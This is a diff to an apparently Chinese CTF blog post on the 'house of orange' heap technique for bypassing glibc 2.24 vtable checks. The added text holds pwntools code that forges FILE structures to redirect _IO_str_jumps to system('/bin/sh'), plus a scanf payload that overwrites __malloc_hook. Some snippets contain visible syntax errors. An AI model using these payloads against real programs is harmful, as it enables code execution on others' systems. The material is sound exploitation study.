@@ -1,7 +1,7 @@
 ---
 layout: post
 title: house of orange in glibc 2.24
-date: 2018-06-25 22:56:03
+date: 2018-07-01 22:56:03
 tags: 
 - pwn
 - file 
@@ -134,6 +134,70 @@ _IO_str_finish (FILE *fp, int dummy)
 7. `fp->_IO_buf_base` = `binsh_addr`
 8. `fp+0xe8` = `system_addr`
 
+定义构造file_struct的函数如下:
+
+```
+def pack_file(_flags = 0,
+              _IO_read_ptr = 0,
+              _IO_read_end = 0,
+              _IO_read_base = 0,
+              _IO_write_base = 0,
+              _IO_write_ptr = 0,
+              _IO_write_end = 0,
+              _IO_buf_base = 0,
+              _IO_buf_end = 0,
+              _IO_save_base = 0,
+              _IO_backup_base = 0,
+              _IO_save_end = 0,
+              _IO_marker = 0,
+              _IO_chain = 0,
+              _fileno = 0,
+              _lock = 0,
+              _wide_data = 0,
+              _mode = 0):
+    file_struct = p32(_flags) + \
+             p32(0) + \
+             p64(_IO_read_ptr) + \
+             p64(_IO_read_end) + \
+             p64(_IO_read_base) + \
+             p64(_IO_write_base) + \
+             p64(_IO_write_ptr) + \
+             p64(_IO_write_end) + \
+             p64(_IO_buf_base) + \
+             p64(_IO_buf_end) + \
+             p64(_IO_save_base) + \
+             p64(_IO_backup_base) + \
+             p64(_IO_save_end) + \
+             p64(_IO_marker) + \
+             p64(_IO_chain) + \
+             p32(_fileno)
+    file_struct = file_struct.ljust(0x88, "\x00")
+    file_struct += p64(_lock)
+    file_struct = file_struct.ljust(0xa0, "\x00")
+    file_struct += p64(_wide_data)
+    file_struct = file_struct.ljust(0xc0, '\x00')
+    file_struct += p64(_mode)
+    file_struct = file_struct.ljust(0xd8, "\x00")
+    return file_struct
+```
+基于这个函数，我们就可以很方便的对上述条件进行封装：
+```
+def pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr):
+    payload = pack_file(_flags = 0,
+                        _IO_read_ptr = 0x61, #smallbin4file_size
+                        _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,
+                        _IO_write_base = 0,
+                        _IO_write_ptr = 1,
+                        _IO_buf_base = binsh_addr,
+                        _mode = 0,
+                        )
+    payload += p64(_IO_str_jumps_addr-8)
+    payload += p64(0) # paddding
+    payload += p64(system_addr)
+    return payload
+```
+我们在构造payload时，只需要提供`_IO_str_jumps`，`_IO_list_all`，`system`,`/bin/sh` 的地址即可。
+
 #### 如何定位`_IO_str_jumps`
 
 由于·`_IO_str_jumps` 不是导出符号，因此无法直接利用pwntools的`libc.sym["_IO_str_jumps"]` 直接进行定位，我们可以转换一下思路，利用 `_IO_str_jumps `表中的导出函数，例如 `_IO_str_underflow` 进行辅助定位，我们可以利用gdb去查找所有包含这个`_IO_str_underflow` 函数地址的内存地址，如下所示：
@@ -181,6 +245,21 @@ poc 见 [De1ta's poc](https://xz.aliyun.com/t/2405#toc-16)，它利用了`__IO_s
 
 绕过glibc 2.24 vtable check的方法不只有house of orange，我们可以利用 unsorted bin attack 去改写file结构体中的某些成员，比如`_IO_2_1_stdin_` 中的 `_IO_buf_end`，这样在 `_IO_buf_base` 和`_IO_buf_end`(`main_arena+0x58`) 存在 `__malloc_hook`，可以利用scanf函数读取数据填充到该区域，注意不要破坏已有数据。 
 
+scanf读取的payload如下：
+
+```python
+def get_stdin_lock_offset(self):
+      IO_2_1_stdin = libc.sym['_IO_2_1_stdin_']
+	  lock_stdin_offset = 0x88
+      return libc.u64(IO_2_1_stdin+lock_stdin_offset)
+		
+payload = "\x00"*5
+payload += p64(libc_base + get_stdin_lock_offset())
+payload += p64(0) * 9
+payload += p64(libc_base + libc.sym['_IO_file_jumps'])
+payload += "\x00" * (libc.sym['__malloc_hook'] - libc.sym['_IO_2_1_stdin_] - 0xe0) # 0xe0 is sizeof file plus struct
+payload += p64(one_shoot)
+```
 详细的利用方法见 SCTF 2018 bufoverflow_a 的[官方wp](https://www.xctf.org.cn/library/details/242b5bc84314a983ee39d5bb5aab5243c875e3fc/) 。
 
 以上绕过 glibc 2.24 vtable check的方法同样适用于2.23。
